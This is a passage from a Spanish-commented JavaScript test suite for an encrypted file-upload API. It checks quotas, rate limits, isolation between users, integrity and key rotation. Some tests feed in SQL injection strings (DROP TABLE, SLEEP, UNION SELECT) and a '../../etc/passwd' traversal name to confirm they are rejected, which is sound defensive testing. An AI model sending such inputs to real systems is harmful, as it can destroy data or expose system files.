    assert.strictEqual(tmpFiles().length, tmpBefore, 'temporal huérfano');
    assert.strictEqual(storedFiles().length, filesBefore);
});

itDb('cuota: por número de archivos y por bytes; cada rechazo sin rastro', async () => {
    const user = await registerAndLogin(app.base, { ip: testIp() });
    const ip = testIp();

    process.env.UPLOAD_MAX_FILES_PER_USER = '2';
    try {
        assert.strictEqual((await upload(user, ip, SAMPLES.png.data, '1.png')).status, 201);
        assert.strictEqual((await upload(user, ip, SAMPLES.png.data, '2.png')).status, 201);
        const third = await upload(user, ip, SAMPLES.png.data, '3.png');
        assert.strictEqual(third.status, 413);
        assert.strictEqual(third.body.code, 'QUOTA_EXCEEDED');
    } finally { delete process.env.UPLOAD_MAX_FILES_PER_USER; }

    const other = await registerAndLogin(app.base, { ip: testIp() });
    process.env.UPLOAD_USER_QUOTA_MB = '0.01'; // ~10 KB
    try {
        assert.strictEqual((await upload(other, ip, bytes([0xff, 0xd8, 0xff, 0xe0], filler(6000)), 'a.jpg')).status, 201);
        const over = await upload(other, ip, bytes([0xff, 0xd8, 0xff, 0xe0], filler(6000)), 'b.jpg');
        assert.strictEqual(over.status, 413);
        assert.strictEqual(over.body.code, 'QUOTA_EXCEEDED');
        const [[{ n }]] = await db.query('SELECT COUNT(*) AS n FROM user_files WHERE user_id = ?', [other.userId]);
        assert.strictEqual(n, 1);
    } finally { delete process.env.UPLOAD_USER_QUOTA_MB; }
});

itDb('cuota: subidas simultáneas no se saltan el límite (fila del usuario bloqueada en la transacción)', async () => {
    const user = await registerAndLogin(app.base, { ip: testIp() });
    process.env.UPLOAD_MAX_FILES_PER_USER = '3';
    try {
        const results = await Promise.all(Array.from({ length: 8 }, (_, i) => upload(user, testIp(), SAMPLES.png.data, `p${i}.png`)));
        const accepted = results.filter(r => r.status === 201).length;
        assert.strictEqual(accepted, 3, `aceptadas: ${accepted}`);
        const [[{ n }]] = await db.query('SELECT COUNT(*) AS n FROM user_files WHERE user_id = ?', [user.userId]);
        assert.strictEqual(n, 3);
    } finally { delete process.env.UPLOAD_MAX_FILES_PER_USER; }
});

itDb('límite de subidas por minuto y usuario → 429', async () => {
    const user = await registerAndLogin(app.base, { ip: testIp() });
    const savedRate = process.env.UPLOAD_RATE_PER_MIN;
    process.env.UPLOAD_RATE_PER_MIN = '3';
    try {
        const ip = testIp();
        const codes = [];
        for (let i = 0; i < 5; i++) codes.push((await upload(user, ip, SAMPLES.png.data, `r${i}.png`)).status);
        assert.deepStrictEqual(codes.slice(0, 3), [201, 201, 201]);
        assert.deepStrictEqual(codes.slice(3), [429, 429]);
    } finally { process.env.UPLOAD_RATE_PER_MIN = savedRate; }
});

// ---------------------------------------------------------------- aislamiento entre usuarios

itDb('aislamiento: otro usuario no ve, no descarga, no borra ni lista mis archivos', async () => {
    const up = await upload(alice, ipA, SAMPLES.pdf.data, 'privado.pdf');
    const id = up.body.file.id;

    assert.strictEqual((await api(app.base, 'GET', `/api/files/${id}`, { token: bob.token, ip: ipB })).status, 404);
    assert.strictEqual((await download(bob, ipB, id)).status, 404);
    assert.strictEqual((await api(app.base, 'DELETE', `/api/files/${id}`, { token: bob.token, ip: ipB })).status, 404);
    const listed = await api(app.base, 'GET', '/api/files?limit=100', { token: bob.token, ip: ipB });
    assert.ok(!listed.body.files.some(f => f.id === id));

    assert.strictEqual((await api(app.base, 'GET', `/api/files/${id}/download`, { ip: ipB })).status, 401, 'sin token');
    assert.strictEqual((await download(alice, ipA, id)).status, 200, 'el dueño sí');
});

itDb('borrado: elimina fila Y archivo del disco; después 404', async () => {
    const up = await upload(alice, ipA, SAMPLES.png.data, 'borrar.png');
    const [[row]] = await db.query('SELECT storage_name FROM user_files WHERE id = ?', [up.body.file.id]);
    const onDisk = storedFiles().find(f => f.includes(row.storage_name));
    assert.ok(onDisk);

    assert.strictEqual((await api(app.base, 'DELETE', `/api/files/${up.body.file.id}`, { token: alice.token, ip: ipA })).status, 200);
    assert.ok(!fs.existsSync(onDisk));
    assert.strictEqual((await download(alice, ipA, up.body.file.id)).status, 404);
    assert.strictEqual((await api(app.base, 'DELETE', `/api/files/${up.body.file.id}`, { token: alice.token, ip: ipA })).status, 404);
});

// ---------------------------------------------------------------- inyección contra la API de archivos

itDb('inyección SQL en id, query y filtros: nada llega a la BD y las tablas siguen intactas', async () => {
    const ip = testIp();
    const attacks = [
        `/api/files/${encodeURIComponent('1 OR 1=1')}`,
        `/api/files/${encodeURIComponent("1; DROP TABLE user_files")}/download`,
        `/api/files?category=${encodeURIComponent("image' OR '1'='1")}`,
        `/api/files?before=${encodeURIComponent('999 UNION SELECT 1,2,3')}`,
        `/api/files?limit=${encodeURIComponent('1; SELECT SLEEP(5)')}`,
        `/api/files/1/download?inline=${encodeURIComponent("true' OR 1=1--")}`
    ];
    for (const route of attacks) {
        const r = await api(app.base, 'GET', route, { token: alice.token, ip: testIp() });
        assert.ok([400, 403, 404].includes(r.status), `${route} → ${r.status}`);
    }
    const [[{ n }]] = await db.query('SELECT COUNT(*) AS n FROM user_files');
    assert.ok(n > 0, 'user_files intacta');
    void ip;
});

itDb('Range malicioso o desmesurado no rompe nada', async () => {
    const up = await upload(alice, ipA, SAMPLES.png.data, 'r.png');
    for (const range of ['bytes=0-99999999999999999999', 'bytes=-99999999999999999999', 'bytes=1e3-2e3', 'bytes=0-1; DROP TABLE', 'bytes=\r\n']) {
        const r = await download(alice, ipA, up.body.file.id, '', range.includes('\n') ? {} : { Range: range });
        assert.ok([200, 206, 400, 403, 416].includes(r.status), `${range} → ${r.status}`);
    }
});

// ---------------------------------------------------------------- integridad: lo alterado en disco se detecta

itDb('archivo alterado en disco: la descarga se corta, queda un evento CRÍTICO y no se entregan bytes falsos', async () => {
    const ip = testIp();
    const user = await registerAndLogin(app.base, { ip });
    const data = bytes([0xff, 0xd8, 0xff, 0xe0], crypto.randomBytes(3 * cipher.CHUNK));
    const up = await upload(user, ip, data, 'integro.jpg');
    const [[row]] = await db.query('SELECT storage_name FROM user_files WHERE id = ?', [up.body.file.id]);
    const file = storedFiles().find(f => f.includes(row.storage_name));

    const raw = fs.readFileSync(file);
    raw[cipher.CHUNK + cipher.TAG + 500] ^= 0xff; // segundo bloque
    fs.writeFileSync(file, raw);

    let received = Buffer.alloc(0);
    let failed = false;
    try {
        const res = await download(user, ip, up.body.file.id);
        received = res.buffer;
        failed = res.buffer.length !== data.length;
    } catch {
        failed = true; // la conexión se cortó a propósito
    }
    assert.ok(failed, 'la descarga NO debe completarse');
    assert.ok(received.length <= cipher.CHUNK + 4, 'solo pudo salir el primer bloque (auténtico), nunca el alterado');
    assert.ok(received.length === 0 || data.subarray(0, received.length).equals(received), 'lo entregado es auténtico');

    await new Promise(r => setTimeout(r, 300));
    const [trail] = await db.query("SELECT severity FROM security_events WHERE event_type = 'FILE_INTEGRITY_FAILURE' AND user_id = ?", [user.userId]);
    assert.ok(trail.length >= 1 && trail[0].severity === 'critical');
});

itDb('archivo truncado o ausente en disco: error controlado, sin colgar ni filtrar rutas', async () => {
    const ip = testIp();
    const user = await registerAndLogin(app.base, { ip });
    const up = await upload(user, ip, SAMPLES.mp4.data, 'v.mp4');
    const [[row]] = await db.query('SELECT storage_name FROM user_files WHERE id = ?', [up.body.file.id]);
    const file = storedFiles().find(f => f.includes(row.storage_name));

    fs.writeFileSync(file, fs.readFileSync(file).subarray(0, 1000));
    let res;
    try { res = await download(user, ip, up.body.file.id); } catch { res = { status: 'cortada' }; }
    assert.ok(res.status === 'cortada' || res.buffer?.length !== SAMPLES.mp4.data.length);

    fs.rmSync(file);
    try { res = await download(user, ip, up.body.file.id); } catch { res = { status: 'cortada' }; }
    assert.ok(!res.text?.includes(filesDir), 'no se filtra la ruta del servidor');
});

// ---------------------------------------------------------------- rotación de claves

itDb('rotación de clave maestra: se re-envuelven las claves de archivo y los archivos siguen descargándose', async () => {
    const secureEnv = require('./src/config/secure-env');
    const ip = testIp();
    const user = await registerAndLogin(app.base, { ip });
    const up = await upload(user, ip, SAMPLES.mp4.data, 'rotar.mp4');
    const id = up.body.file.id;
    const [[before]] = await db.query('SELECT key_encrypted, filename_encrypted, sha256 FROM user_files WHERE id = ?', [id]);
    const diskBefore = storedFiles().map(f => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex'));

    // Nueva clave maestra: se re-cifran SOLO las columnas registradas (lo que hace la rotación real)
    const oldKey = secureEnv.getSecret('encryption');
    const newKey = crypto.randomBytes(32).toString('hex');
    const rewrap = (value) => enc.withKey(newKey, () => enc.encrypt(enc.withKey(oldKey, () => enc.decrypt(value))));
    await db.query('UPDATE user_files SET key_encrypted = ?, filename_encrypted = ? WHERE id = ?',
        [rewrap(before.key_encrypted), rewrap(before.filename_encrypted), id]);

    // Con la clave NUEVA como clave en uso, el archivo se descarga idéntico
    const originalGetKey = enc.getKey;
    enc.getKey = () => newKey;
    try {
        const got = await download(user, ip, id);
        assert.strictEqual(got.status, 200);
        assert.ok(got.buffer.equals(SAMPLES.mp4.data));
    } finally { enc.getKey = originalGetKey; }

    // Los bytes en disco NO se tocaron (no hace falta re-cifrar gigabytes)
    assert.deepStrictEqual(storedFiles().map(f => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex')), diskBefore);
});

// ---------------------------------------------------------------- limpieza de temporales huérfanos

itDb('si el disco no es escribible la subida falla con un 500 genérico y el servidor SIGUE VIVO', async () => {
    const saved = process.env.FILES_DIR;
    process.env.FILES_DIR = '/dev/null/imposible'; // mkdir falla (ENOTDIR)
    try {
        const ip = testIp();
        const res = await upload(alice, ip, SAMPLES.png.data, 'a.png');
        assert.strictEqual(res.status, 500);
        assert.ok(!res.text.includes('/dev/null') && !/ENOTDIR|mkdir/i.test(res.text), 'no se filtran detalles internos');
    } finally { process.env.FILES_DIR = saved; }
    assert.strictEqual((await api(app.base, 'GET', '/health', { ip: testIp() })).status, 200, 'el proceso sigue atendiendo');
    assert.strictEqual((await upload(alice, testIp(), SAMPLES.png.data, 'b.png')).status, 201, 'y se recupera al volver el disco');
});

itDb('limpieza: los temporales viejos se borran y los recientes no', async () => {
    const storage = require('./src/files/storage');
    storage.ensureDirs();
    const oldName = crypto.randomUUID(), freshName = crypto.randomUUID();
    fs.writeFileSync(storage.tmpPath(oldName), 'x');
    fs.writeFileSync(storage.tmpPath(freshName), 'x');
    const longAgo = new Date(Date.now() - 3 * 3600 * 1000);
    fs.utimesSync(storage.tmpPath(oldName), longAgo, longAgo);

    assert.ok((await storage.purgeStaleTemp()) >= 1);
    assert.ok(!fs.existsSync(storage.tmpPath(oldName)));
    assert.ok(fs.existsSync(storage.tmpPath(freshName)));
    fs.rmSync(storage.tmpPath(freshName));
});

itDb('almacenamiento: ningún nombre que no sea un UUID forma parte de una ruta', () => {
    const storage = require('./src/files/storage');
    for (const bad of ['../../etc/passwd', 'a/b', '', 'x'.repeat(36), '1234', null, undefined, '00000000-0000-0000-0000-00000000000g']) {
        assert.throws(() => storage.finalPath(bad), /inválido/, String(bad));
        assert.throws(() => storage.tmpPath(bad), /inválido/, String(bad));
    }
});

itDb('eventos y auditoría: subida, descarga y borrado quedan registrados (cifrados) y los rechazos en la tabla de análisis', async () => {
    const [rows] = await db.query("SELECT DISTINCT event_type FROM security_logs WHERE event_type IN ('FILE_UPLOADED','FILE_DOWNLOADED','FILE_DELETED')");
    assert.deepStrictEqual(rows.map(r => r.event_type).sort(), ['FILE_DELETED', 'FILE_DOWNLOADED', 'FILE_UPLOADED']);
    const [rejected] = await db.query("SELECT COUNT(*) AS n FROM security_events WHERE event_type = 'FILE_REJECTED'");
    assert.ok(rejected[0].n >= 10);
    void events;
});
